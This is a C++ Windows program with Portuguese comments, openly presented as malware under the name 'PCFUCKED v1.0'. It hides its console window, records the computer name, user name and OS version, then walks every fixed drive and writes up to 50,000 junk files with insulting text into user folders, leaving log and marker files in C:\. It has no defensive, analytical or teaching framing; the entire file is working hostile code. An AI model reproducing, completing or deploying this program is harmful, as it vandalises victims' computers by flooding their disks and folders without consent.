#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <filesystem>
#include <shlobj.h>
#include <random>
#include <chrono>

using namespace std;
namespace fs = filesystem;

// ==========================================
// FUNÇÃO PARA CONVERTER WSTRING PARA STRING
// ==========================================
string WStringToString(const wstring& wstr) {
    if (wstr.empty()) return "";
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
    string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}

// ==========================================
// FUNÇÃO PARA OBTER A VERSÃO DO WINDOWS
// ==========================================
string GetWindowsVersion() {
    OSVERSIONINFOEXW osvi = { 0 };
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    
    // Tenta RtlGetVersion primeiro (se disponível)
    typedef LONG (WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (hNtdll) {
        RtlGetVersionPtr RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hNtdll, "RtlGetVersion");
        if (RtlGetVersion) {
            RtlGetVersion((PRTL_OSVERSIONINFOW)&osvi);
            return to_string(osvi.dwMajorVersion) + "." + to_string(osvi.dwMinorVersion);
        }
    }
    
    // Fallback para GetVersionEx (funciona sempre)
    OSVERSIONINFOEXW osvi2 = { 0 };
    osvi2.dwOSVersionInfoSize = sizeof(osvi2);
    GetVersionExW((LPOSVERSIONINFOW)&osvi2);
    return to_string(osvi2.dwMajorVersion) + "." + to_string(osvi2.dwMinorVersion);
}

// ==========================================
// FASE 1: ESCANEAMENTO DO SISTEMA
// ==========================================

struct TargetInfo {
    string computerName;
    string userName;
    string osVersion;
    int osMajor;
    int osMinor;
    bool is64bit;
    vector<wstring> drives;
};

TargetInfo ScanTarget() {
    TargetInfo info;
    
    // Nome do computador
    wchar_t compName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameW(compName, &size);
    info.computerName = WStringToString(wstring(compName));
    
    // Nome do usuário
    wchar_t userName[256];
    size = 256;
    GetUserNameW(userName, &size);
    info.userName = WStringToString(wstring(userName));
    
    // Versão do Windows
    info.osVersion = GetWindowsVersion();
    
    // Arquitetura
    BOOL isWow64 = FALSE;
    IsWow64Process(GetCurrentProcess(), &isWow64);
    info.is64bit = (isWow64 != FALSE);
    
    // Drives disponíveis
    wchar_t drives[256];
    GetLogicalDriveStringsW(256, drives);
    for (int i = 0; drives[i]; i += 4) {
        wstring drive = wstring(&drives[i], &drives[i] + 3);
        if (GetDriveTypeW(drive.c_str()) == DRIVE_FIXED) {
            info.drives.push_back(drive);
        }
    }
    
    return info;
}

// ==========================================
// FASE 2: SPAM DE ARQUIVOS (5.000 arquivos por pasta)
// ==========================================

void SpamFilesInDirectory(const wstring& path, int& totalFiles) {
    for (int i = 0; i < 5000 && totalFiles < 50000; i++) {
        wstring filename = path + L"\\PCFUCKED_" + to_wstring(totalFiles) + L".txt";
        wstring content = L"PCFUCKED\n";
        for (int j = 0; j < 500; j++) {
            content += L"Linha " + to_wstring(j + 1) + L" de 500 - VOCE FOI FUCKED\n";
        }
        
        HANDLE hFile = CreateFileW(filename.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD written;
            WriteFile(hFile, content.c_str(), (DWORD)content.size() * sizeof(wchar_t), &written, NULL);
            CloseHandle(hFile);
            totalFiles++;
        }
    }
}

void RecursiveSpam(const wstring& path, int& totalFiles) {
    if (totalFiles >= 50000) return;
    
    // Tenta escrever na pasta atual
    SpamFilesInDirectory(path, totalFiles);
    if (totalFiles >= 50000) return;
    
    // Entra nas subpastas
    WIN32_FIND_DATAW findData;
    HANDLE hFind = FindFirstFileW((path + L"\\*").c_str(), &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (wcscmp(findData.cFileName, L".") != 0 && wcscmp(findData.cFileName, L"..") != 0) {
                    wstring subPath = path + L"\\" + findData.cFileName;
                    RecursiveSpam(subPath, totalFiles);
                    if (totalFiles >= 50000) break;
                }
            }
        } while (FindNextFileW(hFind, &findData));
        FindClose(hFind);
    }
}

// ==========================================
// FASE 3: EXECUÇÃO PRINCIPAL
// ==========================================

int main() {
    // Esconde a janela do console
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    // Escaneia o sistema
    TargetInfo info = ScanTarget();
    
    // Cria um arquivo de log com as informações
    wstring logPath = L"C:\\PCFUCKED_LOG.txt";
    HANDLE hLog = CreateFileW(logPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hLog != INVALID_HANDLE_VALUE) {
        string log = "PCFUCKED v1.0\nComputer: " + info.computerName + "\nUser: " + info.userName + "\nOS: " + info.osVersion;
        DWORD written;
        WriteFile(hLog, log.c_str(), (DWORD)log.size(), &written, NULL);
        CloseHandle(hLog);
    }
    
    // Para cada drive fixo, começa o spam
    int totalFiles = 0;
    for (const auto& drive : info.drives) {
        if (totalFiles >= 50000) break;
        RecursiveSpam(drive, totalFiles);
    }
    
    // Mensagem de conclusão (opcional)
    wstring completeFlag = L"C:\\PCFUCKED_COMPLETE.txt";
    HANDLE hFlag = CreateFileW(completeFlag.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFlag != INVALID_HANDLE_VALUE) {
        string msg = "PCFUCKED COMPLETO - " + to_string(totalFiles) + " arquivos criados";
        DWORD written;
        WriteFile(hFlag, msg.c_str(), (DWORD)msg.size(), &written, NULL);
        CloseHandle(hFlag);
    }
    
    // Aguarda um pouco para garantir que os arquivos foram escritos
    Sleep(3000);
    
    return 0;
}